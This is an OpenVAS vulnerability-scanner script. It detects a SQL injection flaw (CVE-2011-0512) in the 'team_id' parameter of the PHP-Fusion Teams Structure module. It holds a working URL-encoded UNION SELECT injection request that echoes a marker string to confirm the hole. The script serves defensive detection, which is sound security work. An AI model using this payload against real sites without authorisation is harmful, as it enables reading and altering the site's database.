##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_php_fusion_team_structure_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PHP-Fusion Teams Structure Module 'team_id' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to to view, add, modify or
  delete information in the back-end database.
  Impact Level: Application.";
tag_affected = "PHP-Fusion Teams Structure 3.0";

tag_insight = "The flaw is due to input passed via the 'team_id' parameter to
  'infusions/teams_structure/team.php' is not properly sanitised before being
  used in SQL queries.";
tag_solution = "No solution or patch is available as of 21st April, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.php-fusion.co.uk/index.php";
tag_summary = "This host is running PHP-Fusion Teams Structure Module and is prone
  to SQL injection vulnerability.";

if(description)
{
  script_id(902366);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_cve_id("CVE-2011-0512");
  script_bugtraq_id(45826);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("PHP-Fusion Teams Structure Module 'team_id' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42943");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64727");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16004/");

  script_description(desc);
  script_summary("Check PHP-Fusion Teams Structure Module vulnerable to SQL Injection Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_php_fusion_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

pfPort = get_http_port(default:80);
if(!get_port_state(pfPort)){
  exit(0);
}

## Get the directory from KB
dir = get_dir_from_kb(port:pfPort,app:"php-fusion");
if(!dir){
  exit(0);
}

## Try the exploit
sndReq = http_get(item:string(dir, "/files/infusions/teams_structure/team.php?team_id=" +
                    "-1%27%0Aunion+select%0A%271%27%2C%272%27%2C%273%27%2C%274%27%2C%27" +
                    "SQL-INJECTION-TEST%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%2C%27" +
                    "10%27%2C%2711%27%2C%2712%27%2C%2713%27%2C%2714%27%2C%2715%27%2C%27" +
                    "16%27%2C%2717"), port:pfPort);
rcvRes = http_keepalive_send_recv(port:pfPort, data:sndReq);

## Check for the Response to confirm vulnerability
if(">SQL-INJECTION-TEST<" >< rcvRes){
   security_hole(pfPort);
}
